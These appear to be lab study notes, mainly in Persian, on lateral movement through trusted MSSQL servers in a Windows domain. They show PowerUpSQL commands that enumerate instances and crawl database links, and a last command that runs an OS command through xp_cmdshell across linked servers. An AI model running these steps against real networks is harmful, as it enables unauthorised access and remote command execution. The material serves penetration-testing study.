



---

**سوء‌استفاده از اعتماد — سرورهای MSSQL**

سرورهای MS SQL معمولاً در یک دامین ویندوز به‌طور فراوان پیاده‌سازی می‌شوند.

سرورهای SQL گزینه‌های بسیار خوبی برای حرکت جانبی (lateral movement) فراهم می‌کنند، چون کاربران دامنه می‌توانند به نقش‌های دیتابیس نگاشت (map) شوند.

برای ترفندهای مرتبط با MSSQL و PowerShell، از **PowerUpSQL** استفاده می‌کنیم.

https://github.com/NetSPI/PowerUpSQL



```
get-sqlinstancedomain -verbose
```
result

![[Pasted image 20250924233756.png]]



```
get-sqlinstancedomain | get-sqlconnectiontestthreaded -verbose
```

![[Pasted image 20250924233923.png]]


```
get-sqlinstancedomain | get-sqlserverinfo -verbose
```

![[Pasted image 20250924234037.png]]

for run in command this is first one logoff in pc and again login after import module and run command

```
get-sqlinstancedomain | get-sqlserverinfo -verbose
```


---


**یک Database Link به SQL Server اجازه می‌دهد به منابع داده‌ی خارجی مانند سایر SQL Serverها و منابع داده‌ی OLE DB دسترسی پیدا کند.**  

در صورتی که بین SQL Serverها لینک پایگاه داده (Linked SQL Servers) وجود داشته باشد، امکان اجرای Stored Procedureها فراهم می‌شود.  

لینک‌های پایگاه داده حتی در میان Trust بین فارست‌ها نیز کار می‌کنند.  

---  


look for links to remote server

```
get-sqlserverlink -instance charon.local -verbose
```

![[Pasted image 20250924234451.png]]


```
get-sqlserverlinkcrawl -instance charon.local -verbose
```

![[Pasted image 20250924234611.png]]


run OS command By XP_cmdshell to SQL Server 

```
get-sqlserverlinkcrawl -instance charon.local -query "exec master..xp_cmdshell 'cmd /c whoami'"
```

![[Pasted image 20250924234837.png]]
